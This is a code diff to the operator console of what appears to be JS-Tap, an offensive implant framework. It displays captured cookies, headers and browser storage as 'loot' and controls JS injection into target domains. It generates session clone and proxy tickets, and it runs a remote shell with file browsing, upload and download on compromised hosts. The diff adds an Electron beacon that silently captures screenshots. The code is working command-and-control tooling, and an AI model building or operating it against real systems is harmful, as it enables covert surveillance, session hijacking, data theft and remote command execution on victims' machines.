@@ -1,7 +1,9 @@
 let selectedClientId = "";
 let lastSelectedAppId = "";
 let lastSelectedBrowserId = "";
+let lastSelectedElectronId = "";
 let refreshingDetails = false;
+let activeBexTab = 'loot'; // 'loot' or 'tools'
 let tokenUrl         = "";
 let tokenLocation    = "";
 let tokenKey         = "";
@@ -28,6 +30,7 @@ let clientIncrementAmount = 20;
 // Client arrival tracking
 let _prevAppCount = -1;
 let _prevBrowserCount = -1;
+let _prevElectronCount = -1;
 let _soundEnabled = localStorage.getItem('jstap_sound_notifications') !== 'false';
 
 function playChime(type) {
@@ -418,6 +421,12 @@ function updateEvents()
 		detailCardStack.firstChild.remove();
 	}
 
+	// Clear tools stack
+	var toolsStack = document.getElementById('tools-stack');
+	if (toolsStack) {
+		while (toolsStack.firstChild) toolsStack.firstChild.remove();
+	}
+
 	getClientDetails(selectedClientId);
 }
 
@@ -531,7 +540,7 @@ async function showAllNotesModal()
 	for (let i = 0; i < jsonResponse.length; i++)
 	{
 		var entry = jsonResponse[i];
-		var typeLabel = entry.clientType === 'bex-beacon' ? 'Browser (BEX Beacon)' : 'App (JS Implant)';
+		var typeLabel = entry.clientType === 'bex-beacon' ? 'Browser (BEX Beacon)' : entry.clientType === 'atom-beacon' ? 'Electron (Atom Beacon)' : 'App (DOM Beacon)';
 
 		noteArea.innerHTML += "===========================================\n";
 
@@ -2880,7 +2889,7 @@ async function toggleDomainDetails(domainID, btnElement) {
 			if (cookieCaptures.length === 0) {
 				subTabsHtml += '<div class="alert alert-secondary">No cookies captured.</div>';
 			} else {
-				subTabsHtml += `<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-light"><tr><th>Name</th><th>Value</th><th>HttpOnly</th><th>Secure</th><th>SameSite</th><th>Path</th></tr></thead><tbody>`;
+				subTabsHtml += `<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Name</th><th>Value</th><th>HttpOnly</th><th>Secure</th><th>SameSite</th><th>Path</th></tr></thead><tbody>`;
 				for (var i = 0; i < cookieCaptures.length; i++) {
 					var c = cookieCaptures[i];
 					var meta = null;
@@ -2900,7 +2909,7 @@ async function toggleDomainDetails(domainID, btnElement) {
 			if (headerCaptures.length === 0) {
 				subTabsHtml += '<div class="alert alert-secondary">No headers captured.</div>';
 			} else {
-				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-light"><tr><th>Header Name</th><th>Value</th></tr></thead><tbody>';
+				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Header Name</th><th>Value</th></tr></thead><tbody>';
 				for (var i = 0; i < headerCaptures.length; i++) {
 					var c = headerCaptures[i];
 					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
@@ -2914,7 +2923,7 @@ async function toggleDomainDetails(domainID, btnElement) {
 			if (localStorageCaptures.length === 0) {
 				subTabsHtml += '<div class="alert alert-secondary">No local storage captured.</div>';
 			} else {
-				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-light"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
+				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
 				for (var i = 0; i < localStorageCaptures.length; i++) {
 					var c = localStorageCaptures[i];
 					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
@@ -2928,7 +2937,7 @@ async function toggleDomainDetails(domainID, btnElement) {
 			if (sessionStorageCaptures.length === 0) {
 				subTabsHtml += '<div class="alert alert-secondary">No session storage captured.</div>';
 			} else {
-				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-light"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
+				subTabsHtml += '<div class="table-responsive"><table class="table table-sm table-striped table-bordered"><thead class="table-dark"><tr><th>Key</th><th>Value</th></tr></thead><tbody>';
 				for (var i = 0; i < sessionStorageCaptures.length; i++) {
 					var c = sessionStorageCaptures[i];
 					subTabsHtml += '<tr><td>' + escapeHTML(c.name) + '</td><td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">' + escapeHTML(c.value) + '</td></tr>';
@@ -2948,7 +2957,7 @@ async function toggleDomainDetails(domainID, btnElement) {
 
 function toggleBexInjection(beaconID, domain, isActive) {
     if (isActive) {
-        showConfirmModal('Stop Injection', 'Stop injecting JS-Tap into ' + domain + '?', function() {
+        showConfirmModal('Stop Injection', 'Stop injecting DOM Beacon into ' + domain + '?', function() {
             fetch('/api/bex/stop_inject', {
                 method: 'POST',
                 body: JSON.stringify({ beaconID: beaconID, domain: domain }),
@@ -2984,10 +2993,34 @@ async function generateBexTicket(domainID) {
         }
         var ticket = await resp.json();
         var text = btoa(JSON.stringify(ticket));
-        await navigator.clipboard.writeText(text);
-        showToast('BEX ticket copied to clipboard');
+        navigator.clipboard.writeText(text).then(function() {
+            showToast('BEX Clone Ticket copied to clipboard');
+        }).catch(function() {
+            showToast('Clipboard unavailable', 'danger');
+        });
     } catch (err) {
-        showToast('Failed to copy ticket: ' + err.message, 'danger');
+        showToast('Failed to generate ticket: ' + err.message, 'danger');
+    }
+}
+
+
+async function generateProxyTicket(beaconId) {
+    try {
+        var resp = await fetch('/api/bex/proxy_ticket/' + beaconId);
+        if (!resp.ok) {
+            var errData = await resp.json().catch(function() { return {}; });
+            showToast(errData.error || 'Proxy not active for this beacon', 'danger');
+            return;
+        }
+        var ticket = await resp.json();
+        var text = btoa(JSON.stringify(ticket));
+        navigator.clipboard.writeText(text).then(function() {
+            showToast('BEX Proxy Ticket copied to clipboard');
+        }).catch(function() {
+            showToast('Clipboard unavailable', 'danger');
+        });
+    } catch (err) {
+        showToast('Failed to generate proxy ticket: ' + err.message, 'danger');
     }
 }
 
@@ -3003,6 +3036,8 @@ var _sidecarShellHistoryIndex = -1;
 var _sidecarShellOutput = '';
 var _sidecarShellBeaconId = '';
 var _sidecarShellNickname = '';
+var _sidecarShellQueue = [];
+var _sidecarShellRunning = false;
 
 function sidecarDownloadFile() {
     if (!_sidecarLastReadContent || !_sidecarLastReadFileName) return;
@@ -3045,7 +3080,7 @@ async function sidecarUploadFile(beaconId) {
     var sep = base.endsWith('/') || base.endsWith('\\') ? '' : '/';
     var dest = base + sep + file.name;
 
-    statusDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Uploading...';
+    statusDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Uploading...';
 
     try {
         var buffer = await file.arrayBuffer();
@@ -3086,7 +3121,7 @@ async function sidecarBrowse(beaconId) {
     var path = pathInput ? pathInput.value : '/';
     var resultsDiv = document.getElementById('sidecar-file-results');
     if (!resultsDiv) return;
-    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Browsing...';
+    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Browsing...';
 
     try {
         var resp = await fetch('/api/sidecar/command', {
@@ -3143,7 +3178,7 @@ async function sidecarBrowse(beaconId) {
                 html += '<td>' + (e.isDir ? '' : formatSidecarBytes(e.size)) + '</td>';
                 html += '<td><small>' + escapeHTML(e.modTime || '') + '</small></td>';
                 if (!e.isDir) {
-                    html += '<td><button class="btn btn-outline-primary btn-sm py-0 px-1" style="font-size:0.75em;" onclick="sidecarReadFile(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\')">Read</button></td>';
+                    html += '<td><button class="btn btn-primary btn-sm py-0 px-1" style="font-size:0.75em;" onclick="sidecarReadFile(\'' + beaconId + '\', \'' + escapeHTML(fullPath).replace(/'/g, "\\'") + '\')">Read</button></td>';
                 } else {
                     html += '<td></td>';
                 }
@@ -3186,7 +3221,7 @@ function sidecarShellRemoveRunning(runId) {
     if (el) el.remove();
 }
 
-async function sidecarShellExec(beaconId) {
+function sidecarShellExec(beaconId) {
     var cmdInput = document.getElementById('sidecar-shell-input');
     var rawCmd = cmdInput ? cmdInput.value : '';
     if (!rawCmd.trim()) return;
@@ -3195,6 +3230,21 @@ async function sidecarShellExec(beaconId) {
     _sidecarShellHistory.push(rawCmd);
     _sidecarShellHistoryIndex = _sidecarShellHistory.length;
 
+    // Queue the raw command; the runner will wrap it with the current CWD
+    _sidecarShellQueue.push({ beaconId: beaconId, rawCmd: rawCmd });
+    _sidecarShellProcessQueue();
+}
+
+function _sidecarShellProcessQueue() {
+    if (_sidecarShellRunning || _sidecarShellQueue.length === 0) return;
+    _sidecarShellRunning = true;
+
+    var item = _sidecarShellQueue.shift();
+    _sidecarShellRunOne(item.beaconId, item.rawCmd);
+}
+
+async function _sidecarShellRunOne(beaconId, rawCmd) {
+    // Wrap with CURRENT CWD (which may have been updated by prior queued commands)
     var cwdEscaped = _sidecarShellCwd.replace(/'/g, "'\\''");
     var wrappedCmd;
     if (_sidecarShellCwd) {
@@ -3205,7 +3255,7 @@ async function sidecarShellExec(beaconId) {
 
     var promptText = escapeHTML((_sidecarShellCwd || '~') + ' $ ' + rawCmd);
     var runId = Date.now() + '' + Math.random();
-    sidecarShellAppendOutput('<div style="color:#6c9;white-space:pre-wrap;">' + promptText + '</div>');
+    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + promptText + '</div>');
     sidecarShellAppendOutput('<div id="shell-running-' + escapeHTML(runId) + '" style="color:#888;"><span class="spinner-border spinner-border-sm" role="status"></span> Running...</div>');
 
     try {
@@ -3218,7 +3268,9 @@ async function sidecarShellExec(beaconId) {
         if (!resp.ok) {
             var errText = await resp.text();
             sidecarShellRemoveRunning(runId);
-            sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(errText) + '</div>');
+            sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">ERROR: ' + escapeHTML(errText) + '</div>');
+            _sidecarShellRunning = false;
+            _sidecarShellProcessQueue();
             return;
         }
 
@@ -3226,39 +3278,44 @@ async function sidecarShellExec(beaconId) {
         pollSidecarResult(json.requestId, function(result) {
             sidecarShellRemoveRunning(runId);
             if (!result.success) {
-                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">ERROR: ' + escapeHTML(result.error || 'Unknown error') + '</div>');
-                return;
-            }
-
-            var stdout = (result.data && result.data.stdout) || '';
-            var stderr = (result.data && result.data.stderr) || '';
-
-            // Parse CWD from stdout
-            var markerStr = '__SIDECAR_CWD__';
-            var markerIdx = stdout.lastIndexOf(markerStr);
-            if (markerIdx !== -1) {
-                var cmdOutput = stdout.substring(0, markerIdx).replace(/\n$/, '');
-                var newCwd = stdout.substring(markerIdx + markerStr.length).trim();
-                if (newCwd) _sidecarShellCwd = newCwd;
-                if (cmdOutput) {
-                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(cmdOutput) + '</div>');
-                }
+                sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">ERROR: ' + escapeHTML(result.error || 'Unknown error') + '</div>');
             } else {
-                // Marker not found (timeout or binary output) — show all stdout
-                if (stdout) {
-                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stdout) + '</div>');
+                var stdout = (result.data && result.data.stdout) || '';
+                var stderr = (result.data && result.data.stderr) || '';
+
+                // Parse CWD from stdout
+                var markerStr = '__SIDECAR_CWD__';
+                var markerIdx = stdout.lastIndexOf(markerStr);
+                if (markerIdx !== -1) {
+                    var cmdOutput = stdout.substring(0, markerIdx).replace(/\n$/, '');
+                    var newCwd = stdout.substring(markerIdx + markerStr.length).trim();
+                    if (newCwd) _sidecarShellCwd = newCwd;
+                    if (cmdOutput) {
+                        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(cmdOutput) + '</div>');
+                    }
+                } else {
+                    // Marker not found (timeout or binary output) — show all stdout
+                    if (stdout) {
+                        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stdout) + '</div>');
+                    }
                 }
+
+                if (stderr) {
+                    sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">' + escapeHTML(stderr) + '</div>');
+                }
+
+                sidecarShellUpdatePrompt();
             }
 
-            if (stderr) {
-                sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">' + escapeHTML(stderr) + '</div>');
-            }
-
-            sidecarShellUpdatePrompt();
+            // Process next queued command (CWD is now up to date)
+            _sidecarShellRunning = false;
+            _sidecarShellProcessQueue();
         });
     } catch (e) {
         sidecarShellRemoveRunning(runId);
-        sidecarShellAppendOutput('<div style="color:#f55;white-space:pre-wrap;">Request failed: ' + escapeHTML(String(e)) + '</div>');
+        sidecarShellAppendOutput('<div style="color:#ddd;white-space:pre-wrap;">Request failed: ' + escapeHTML(String(e)) + '</div>');
+        _sidecarShellRunning = false;
+        _sidecarShellProcessQueue();
     }
 }
 
@@ -3302,16 +3359,16 @@ function sidecarPopOutShell(beaconId) {
     'body { margin:0; padding:0; background:#1e1e1e; color:#ddd; font-family:monospace; font-size:14px; display:flex; flex-direction:column; height:100vh; }' +
     '#title-bar { background:#333; padding:6px 12px; display:flex; align-items:center; gap:8px; }' +
     '#title-input { background:transparent; border:1px solid #555; color:#ddd; font-size:14px; flex:1; padding:2px 6px; border-radius:3px; font-family:monospace; }' +
-    '#title-input:focus { outline:none; border-color:#6c9; }' +
+    '#title-input:focus { outline:none; border-color:#ddd; }' +
     '#output { flex:1; overflow-y:auto; padding:8px 12px; }' +
     '#input-bar { display:flex; align-items:center; padding:6px 12px; background:#252525; border-top:1px solid #444; gap:6px; }' +
-    '#prompt { color:#6c9; white-space:nowrap; }' +
+    '#prompt { color:#ddd; white-space:nowrap; }' +
     '#cmd-input { flex:1; background:transparent; border:1px solid #555; color:#ddd; font-family:monospace; font-size:14px; padding:4px 6px; border-radius:3px; }' +
-    '#cmd-input:focus { outline:none; border-color:#6c9; }' +
+    '#cmd-input:focus { outline:none; border-color:#ddd; }' +
     '.btn-shell { background:#444; color:#ddd; border:1px solid #666; padding:4px 12px; border-radius:3px; cursor:pointer; font-size:13px; }' +
     '.btn-shell:hover { background:#555; }' +
     '</style></head><body>' +
-    '<div id="title-bar"><span style="color:#6c9;font-weight:bold;">&#9638;</span>' +
+    '<div id="title-bar"><span style="color:#ddd;font-weight:bold;">&#9638;</span>' +
     '<input id="title-input" value="' + escapeHTML(titleText).replace(/"/g, '&quot;') + '" oninput="document.title=this.value"></div>' +
     '<div id="output">' + transferState.output + '</div>' +
     '<div id="input-bar">' +
@@ -3331,21 +3388,24 @@ function sidecarPopOutShell(beaconId) {
     'function removeRunning(rid){var re=new RegExp(\'<div [^>]*id="shell-running-\'+rid.replace(/[.*+?^${}()|[\\]\\\\]/g,"\\\\$&")+\'"[^>]*>.*?</div>\');accOutput=accOutput.replace(re,"");var el=document.getElementById("shell-running-"+rid);if(el)el.remove();}' +
     'function updatePrompt(){var p=document.getElementById("prompt");p.textContent=(cwd||"~")+" $ ";}' +
     'function pollResult(reqId,cb,att){att=att||0;if(att>60){cb({success:false,error:"Timed out"});return;}var d=att<5?1000:3000;setTimeout(async function(){try{var r=await fetch("/api/sidecar/result/"+reqId);var j=await r.json();if(j.ready){cb(j);}else{pollResult(reqId,cb,att+1);}}catch(e){cb({success:false,error:"Poll failed: "+e});}},d);}' +
-    'async function runCmd(){var inp=document.getElementById("cmd-input");var raw=inp.value;if(!raw.trim())return;inp.value="";history.push(raw);histIdx=history.length;' +
+    'var cmdQueue=[];var queueRunning=false;' +
+    'function runCmd(){var inp=document.getElementById("cmd-input");var raw=inp.value;if(!raw.trim())return;inp.value="";history.push(raw);histIdx=history.length;cmdQueue.push(raw);processQueue();}' +
+    'function processQueue(){if(queueRunning||cmdQueue.length===0)return;queueRunning=true;runOne(cmdQueue.shift());}' +
+    'async function runOne(raw){' +
     'var cwdEsc=cwd.replace(/\'/g,"\'\\\\\'\'");var wrapped;' +
     'if(cwd){wrapped="cd \'"+cwdEsc+"\' && "+raw+"; echo \'__SIDECAR_CWD__\'; pwd";}else{wrapped=raw+"; echo \'__SIDECAR_CWD__\'; pwd";}' +
     'var pt=esc((cwd||"~")+" $ "+raw);var rid=Date.now()+""+Math.random();' +
-    'appendOut(\'<div style="color:#6c9;white-space:pre-wrap;">\'+pt+"</div>");' +
+    'appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+pt+"</div>");' +
     'appendOut(\'<div id="shell-running-\'+rid+\'" style="color:#888;"><span style="display:inline-block;width:12px;height:12px;border:2px solid #888;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;"></span> Running...</div>\');' +
     'try{var resp=await fetch("/api/sidecar/command",{method:"POST",body:JSON.stringify({beaconID:beaconId,command:"exec_cmd",args:{command:wrapped}}),headers:{"Content-type":"application/json"}});' +
-    'if(!resp.ok){var et=await resp.text();removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(et)+"</div>");return;}' +
-    'var json=await resp.json();pollResult(json.requestId,function(result){removeRunning(rid);if(!result.success){appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(result.error||"Unknown error")+"</div>");return;}' +
+    'if(!resp.ok){var et=await resp.text();removeRunning(rid);appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">ERROR: \'+esc(et)+"</div>");queueRunning=false;processQueue();return;}' +
+    'var json=await resp.json();pollResult(json.requestId,function(result){removeRunning(rid);if(!result.success){appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">ERROR: \'+esc(result.error||"Unknown error")+"</div>");queueRunning=false;processQueue();return;}' +
     'var stdout=(result.data&&result.data.stdout)||"";var stderr=(result.data&&result.data.stderr)||"";' +
     'var mk="__SIDECAR_CWD__";var mi=stdout.lastIndexOf(mk);' +
     'if(mi!==-1){var co=stdout.substring(0,mi).replace(/\\n$/,"");var nc=stdout.substring(mi+mk.length).trim();if(nc)cwd=nc;if(co)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(co)+"</div>");}' +
     'else{if(stdout)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stdout)+"</div>");}' +
-    'if(stderr)appendOut(\'<div style="color:#f55;white-space:pre-wrap;">\'+esc(stderr)+"</div>");updatePrompt();});}' +
-    'catch(e){removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">Request failed: \'+esc(String(e))+"</div>");}}' +
+    'if(stderr)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stderr)+"</div>");updatePrompt();queueRunning=false;processQueue();});}' +
+    'catch(e){removeRunning(rid);appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">Request failed: \'+esc(String(e))+"</div>");queueRunning=false;processQueue();}}' +
     'document.getElementById("cmd-input").addEventListener("keydown",function(ev){if(ev.key==="Enter"){runCmd();}else if(ev.key==="ArrowUp"){ev.preventDefault();if(histIdx>0){histIdx--;this.value=history[histIdx];}}else if(ev.key==="ArrowDown"){ev.preventDefault();if(histIdx<history.length-1){histIdx++;this.value=history[histIdx];}else{histIdx=history.length;this.value="";}}});' +
     'document.getElementById("run-btn").addEventListener("click",runCmd);' +
     'var o=document.getElementById("output");o.scrollTop=o.scrollHeight;' +
@@ -3362,7 +3422,7 @@ function sidecarPopOutShell(beaconId) {
 async function sidecarReadFile(beaconId, path) {
     var resultsDiv = document.getElementById('sidecar-file-results');
     if (!resultsDiv) return;
-    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Reading file...';
+    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-secondary" role="status"></div> Reading file...';
 
     try {
         var resp = await fetch('/api/sidecar/command', {
@@ -3392,7 +3452,7 @@ async function sidecarReadFile(beaconId, path) {
             _sidecarLastReadFileName = pathParts[pathParts.length - 1] || 'download';
 
             var backBtn = '<button class="btn btn-outline-secondary btn-sm mb-2" onclick="sidecarBrowse(\'' + beaconId + '\')">Back to directory</button>';
-            var dlBtn = ' <button class="btn btn-outline-primary btn-sm mb-2" onclick="sidecarDownloadFile()">Download</button>';
+            var dlBtn = ' <button class="btn btn-primary btn-sm mb-2" onclick="sidecarDownloadFile()">Download</button>';
             resultsDiv.innerHTML = backBtn + dlBtn +
                 '<div class="mb-1"><b>' + escapeHTML(path) + '</b> (' + formatSidecarBytes(result.data.size) + ')' +
                 (result.data.truncated ? ' <span class="badge bg-warning text-dark">Truncated</span>' : '') + '</div>' +
@@ -3437,7 +3497,80 @@ function formatSidecarBytes(bytes) {
 }
 
 
-async function getClientDetails(id) 
+// ===== Atom Beacon Screenshot Controls =====
+
+async function atomCaptureScreenshot(beaconId) {
+    var btn = document.getElementById('sidecar-screenshot-btn');
+    var status = document.getElementById('sidecar-screenshot-status');
+    if (btn) btn.disabled = true;
+    if (status) status.textContent = 'Sending capture request...';
+
+    try {
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'screenshot', args: {} }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            if (status) status.textContent = 'Error: ' + errText;
+            if (btn) btn.disabled = false;
+            return;
+        }
+
+        var json = await resp.json();
+        if (status) status.textContent = 'Waiting for capture...';
+
+        pollSidecarResult(json.requestId, function(result) {
+            if (btn) btn.disabled = false;
+            if (result.success) {
+                if (status) status.textContent = 'Screenshot captured! Check Loot tab.';
+                showToast('Screenshot captured', 'success');
+            } else {
+                if (status) status.textContent = 'Failed: ' + (result.error || 'Unknown error');
+            }
+            // Clear status after a few seconds
+            setTimeout(function() { if (status) status.textContent = ''; }, 5000);
+        });
+    } catch (e) {
+        if (btn) btn.disabled = false;
+        if (status) status.textContent = 'Request failed: ' + String(e);
+    }
+}
+
+async function atomSaveScreenshotSettings(beaconId) {
+    var settingsStatus = document.getElementById('atom-ss-settings-status');
+    var settings = {
+        onFocus: document.getElementById('atom-ss-on-focus')?.checked || false,
+        onNavigate: document.getElementById('atom-ss-on-navigate')?.checked || false,
+        onNewWindow: document.getElementById('atom-ss-on-newwindow')?.checked || false,
+        cooldownSec: parseInt(document.getElementById('atom-ss-cooldown')?.value) || 30
+    };
+
+    try {
+        var resp = await fetch('/api/sidecar/command', {
+            method: 'POST',
+            body: JSON.stringify({ beaconID: beaconId, command: 'screenshot_settings', args: settings }),
+            headers: { "Content-type": "application/json" }
+        });
+
+        if (!resp.ok) {
+            var errText = await resp.text();
+            if (settingsStatus) settingsStatus.textContent = 'Error: ' + errText;
+            return;
+        }
+
+        if (settingsStatus) settingsStatus.textContent = 'Settings queued.';
+        showToast('Screenshot settings sent', 'success');
+        setTimeout(function() { if (settingsStatus) settingsStatus.textContent = ''; }, 3000);
+    } catch (e) {
+        if (settingsStatus) settingsStatus.textContent = 'Failed: ' + String(e);
+    }
+}
+
+
+async function getClientDetails(id, autoRefresh)
 {
     if (refreshingDetails) return;
     refreshingDetails = true;
@@ -3452,32 +3585,46 @@ async function getClientDetails(id)
         if (client) {
             if (client.clientType === 'bex-beacon') {
                 lastSelectedBrowserId = client.id;
+            } else if (client.clientType === 'atom-beacon') {
+                lastSelectedElectronId = client.id;
             } else {
                 lastSelectedAppId = client.id;
             }
         }
 
         var cardStack = document.getElementById('detail-stack');
+        var toolsStack = document.getElementById('tools-stack');
         const lootHeader = document.getElementById('loot-header-text');
-        
+
         // Save scroll position
         const scrollPos = cardStack.scrollTop;
 
-        // Update Header Label based on the ACTUAL client being loaded
-        if (client && lootHeader) {
-            const label = client.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
-            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
+        // Update Header: toggle for beacon types, plain label for Apps
+        if (client) {
+            if (client.clientType === 'bex-beacon') {
+                setupBeaconHeaderToggle('Browser');
+            } else if (client.clientType === 'atom-beacon') {
+                setupBeaconHeaderToggle('Electron');
+            } else {
+                removeBeaconHeaderToggle();
+                if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
+            }
         }
 
         // Only clear if we are switching to a brand NEW client (not a refresh)
         // If we are refreshing the same client, we want to update in-place to avoid flashing
         const isRefresh = (cardStack.getAttribute('data-loaded-id') == id);
-        
+
         if (!isRefresh) {
             while (cardStack.firstChild) {
                 cardStack.firstChild.remove();
             }
+            // Clear tools stack on client switch
+            if (toolsStack) {
+                while (toolsStack.firstChild) toolsStack.firstChild.remove();
+            }
             cardStack.setAttribute('data-loaded-id', id);
+            cardStack._lastMaxEventId = 0;
 
             // Reset sidecar shell state on client switch
             _sidecarCurrentPath = '';
@@ -3489,24 +3636,67 @@ async function getClientDetails(id)
             _sidecarShellNickname = '';
         }
 
-        if (client && client.clientType === 'bex-beacon') {
-            // Handle Beacon View
-
-            // Sidecar panel (if available)
-            if (client.sidecarAvailable) {
+        if (client && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon')) {
+            // Sidecar panel for beacon-type clients (if available)
+            if (client.sidecarSupported) {
                 let sidecarPanel = document.getElementById('sidecar-panel');
+                var isAtomBeacon = client.clientType === 'atom-beacon';
+                var panelTitle = isAtomBeacon ? 'Tools' : 'Sidecar';
+                var sidecarBadgeHtml;
+                if (isAtomBeacon) {
+                    // Atom-beacon has built-in tools, no sidecar binary
+                    sidecarBadgeHtml = '<span class="badge bg-secondary" id="sidecar-badge">Built-in</span>';
+                } else {
+                    sidecarBadgeHtml = client.sidecarConnected
+                        ? '<span class="badge bg-success" id="sidecar-badge">Connected</span>'
+                        : '<span class="badge bg-info" id="sidecar-badge">Supported</span>';
+                }
                 if (!sidecarPanel) {
                     // Store nickname and beacon id for shell
                     _sidecarShellNickname = client.tag || client.nickname || '';
                     _sidecarShellBeaconId = id;
+                    var screenshotTabHtml = isAtomBeacon ? `
+                                <li class="nav-item">
+                                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-screenshots" type="button">Screenshots</button>
+                                </li>` : '';
+                    var screenshotPaneHtml = isAtomBeacon ? `
+                                <div class="tab-pane fade" id="sidecar-screenshots">
+                                    <div class="mb-3">
+                                        <button class="btn btn-primary btn-sm" id="sidecar-screenshot-btn" onclick="atomCaptureScreenshot('${id}')">Capture Now</button>
+                                        <span id="sidecar-screenshot-status" class="ms-2 small text-muted"></span>
+                                    </div>
+                                    <div class="mb-3 border-top pt-2">
+                                        <div class="form-check form-switch mb-1">
+                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-focus" checked>
+                                            <label class="form-check-label small" for="atom-ss-on-focus">Capture on window focus</label>
+                                        </div>
+                                        <div class="form-check form-switch mb-1">
+                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-navigate" checked>
+                                            <label class="form-check-label small" for="atom-ss-on-navigate">Capture on navigation</label>
+                                        </div>
+                                        <div class="form-check form-switch mb-1">
+                                            <input class="form-check-input" type="checkbox" id="atom-ss-on-newwindow" checked>
+                                            <label class="form-check-label small" for="atom-ss-on-newwindow">Capture on new window</label>
+                                        </div>
+                                        <div class="d-flex align-items-center gap-2 mt-2">
+                                            <label class="small text-muted text-nowrap" for="atom-ss-cooldown">Cooldown (sec):</label>
+                                            <input type="number" class="form-control form-control-sm" id="atom-ss-cooldown" value="30" min="5" max="600" style="width:80px;">
+                                        </div>
+                                    </div>
+                                    <div class="d-flex gap-2">
+                                        <button class="btn btn-outline-success btn-sm" onclick="atomSaveScreenshotSettings('${id}')">Save Settings</button>
+                                        <span id="atom-ss-settings-status" class="small text-muted align-self-center"></span>
+                                    </div>
+                                </div>` : '';
 
                     sidecarPanel = document.createElement('div');
                     sidecarPanel.id = 'sidecar-panel';
                     sidecarPanel.setAttribute('data-beacon-id', id);
                     sidecarPanel.className = 'card mb-3 border-secondary';
+                    sidecarPanel.style.overflow = 'hidden';
                     sidecarPanel.innerHTML = `
                         <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#sidecar-collapse" aria-expanded="false" aria-controls="sidecar-collapse">
-                            <span><b>Sidecar</b> <span class="badge bg-success">Connected</span></span>
+                            <span><b>${panelTitle}</b> ${sidecarBadgeHtml}</span>
                             <svg id="sidecar-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(-90deg);">
                                 <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
                             </svg>
@@ -3520,16 +3710,17 @@ async function getClientDetails(id)
                                 <li class="nav-item">
                                     <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-shell" type="button">Shell</button>
                                 </li>
+                                ${screenshotTabHtml}
                             </ul>
                             <div class="tab-content border border-top-0 p-3">
                                 <div class="tab-pane fade show active" id="sidecar-files">
                                     <div class="input-group mb-2">
                                         <input type="text" class="form-control form-control-sm" id="sidecar-path" placeholder="/" value="">
-                                        <button class="btn btn-outline-primary btn-sm" onclick="sidecarBrowse('${id}')">Browse</button>
+                                        <button class="btn btn-primary btn-sm" onclick="sidecarBrowse('${id}')">Browse</button>
                                     </div>
                                     <div class="d-flex gap-2 mb-2 align-items-center flex-wrap">
